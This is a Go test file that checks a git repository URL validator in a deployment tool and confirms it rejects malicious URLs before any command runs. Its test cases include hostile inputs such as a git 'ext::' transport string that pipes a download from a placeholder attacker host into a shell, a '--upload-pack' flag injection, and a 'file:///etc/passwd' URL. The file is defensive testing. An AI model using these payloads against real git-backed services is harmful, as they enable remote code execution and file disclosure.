package gitops

import (
	"os/exec"
	"strings"
	"testing"

	"lighthouse/db"
)

// TestValidateRepoURL exercises every branch of ValidateRepoURL: the happy
// path (allow-listed schemes), the hostile path (git "transport helper"
// syntax that would let `git clone` execute arbitrary commands, disallowed
// schemes, injection attempts) and edge/empty input.
func TestValidateRepoURL(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name    string
		raw     string
		wantErr bool
		errSub  string // substring expected in the error message, if wantErr
	}{
		// ── Happy path ──────────────────────────────────────────────────
		{name: "https scheme", raw: "https://github.com/org/repo.git", wantErr: false},
		{name: "http scheme", raw: "http://internal-git.local/org/repo.git", wantErr: false},
		{name: "git scheme", raw: "git://github.com/org/repo.git", wantErr: false},
		{name: "ssh scheme", raw: "ssh://git@github.com/org/repo.git", wantErr: false},
		{name: "https with port and path", raw: "https://git.example.com:8443/org/repo.git", wantErr: false},
		{name: "https with credentials in host (still allow-listed scheme)", raw: "https://user@github.com/org/repo.git", wantErr: false},

		// ── Hostile path: git transport-helper RCE / scheme smuggling ──
		{name: "ext:: transport helper (RCE)", raw: "ext::sh -c \"curl http://attacker/x|sh\"", wantErr: true, errSub: "transport syntax"},
		{name: "fd:: transport helper", raw: "fd::0", wantErr: true, errSub: "transport syntax"},
		{name: "double-colon embedded mid-string", raw: "https://github.com/org/repo.git::ext::sh -c evil", wantErr: true, errSub: "transport syntax"},
		{name: "file scheme (local file disclosure)", raw: "file:///etc/passwd", wantErr: true, errSub: "must use"},
		{name: "ftp scheme", raw: "ftp://example.com/repo.git", wantErr: true, errSub: "must use"},
		{name: "no scheme at all", raw: "github.com/org/repo.git", wantErr: true, errSub: "must use"},
		{name: "javascript pseudo-scheme", raw: "javascript://alert(1)", wantErr: true, errSub: "must use"},
		{name: "leading dash flag injection", raw: "--upload-pack=touch /tmp/pwned", wantErr: true, errSub: "must use"},
		{name: "whitespace-only", raw: "   ", wantErr: true, errSub: "must use"},
		{name: "scheme allow-listed but case-mismatched", raw: "HTTPS://github.com/org/repo.git", wantErr: true, errSub: "must use"},

		// ── Edge: empty ─────────────────────────────────────────────────
		{name: "empty string", raw: "", wantErr: true, errSub: "required"},
	}

	for _, tc := range tests {
		tc := tc
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			err := ValidateRepoURL(tc.raw)
			if tc.wantErr {
				if err == nil {
					t.Fatalf("ValidateRepoURL(%q) = nil, want error containing %q", tc.raw, tc.errSub)
				}
				if tc.errSub != "" && !strings.Contains(err.Error(), tc.errSub) {
					t.Fatalf("ValidateRepoURL(%q) error = %q, want substring %q", tc.raw, err.Error(), tc.errSub)
				}
			} else if err != nil {
				t.Fatalf("ValidateRepoURL(%q) = %v, want nil", tc.raw, err)
			}
		})
	}
}

// TestValidateRepoURL_WiredIntoProcessProject confirms the git-deployment
// path of processProject actually rejects a malicious transport-helper
// RepoURL before ever invoking exec.Command, instead of relying solely on
// the HTTP-layer check in main.go (defense in depth).
func TestValidateRepoURL_WiredIntoProcessProject(t *testing.T) {
	setupTestDB(t)

	origExec := execCommand
	defer func() { execCommand = origExec }()

	execCalled := false
	execCommand = func(command string, args ...string) *exec.Cmd {
		execCalled = true
		return mockExecCommand(command, args...)
	}

	p := db.GitProject{
		ID:      1,
		Name:    "malicious-project",
		RepoURL: "ext::sh -c \"touch /tmp/pwned\"",
		Branch:  "main",
		Status:  "pending",
	}

	err := processProject(p)
	if err == nil {
		t.Fatal("processProject with ext:: RepoURL = nil error, want rejection")
	}
	if !strings.Contains(err.Error(), "transport syntax") {
		t.Fatalf("processProject error = %q, want it to mention transport syntax", err.Error())
	}
	if execCalled {
		t.Fatal("exec.Command was invoked despite an invalid repo_url — validation must happen before any subprocess is spawned")
	}
}

// TestValidateRepoURL_InlineSourceSkipsGitValidation confirms inline compose
// projects (no git operations at all) are unaffected by the repo_url check.
func TestValidateRepoURL_InlineSourceSkipsGitValidation(t *testing.T) {
	setupTestDB(t)

	p := db.GitProject{
		ID:             2,
		Name:           "inline-project",
		SourceType:     "inline",
		ComposeContent: "version: '3'\nservices:\n  app:\n    image: alpine\n",
		Status:         "pending",
	}

	origExec := execCommand
	defer func() { execCommand = origExec }()
	execCommand = func(command string, args ...string) *exec.Cmd {
		// docker compose up will still run for inline projects; keep it a no-op success.
		return mockExecCommand(command, args...)
	}

	if err := processProject(p); err != nil {
		t.Fatalf("processProject(inline) = %v, want nil (repo_url validation must not apply to inline sources)", err)
	}
}

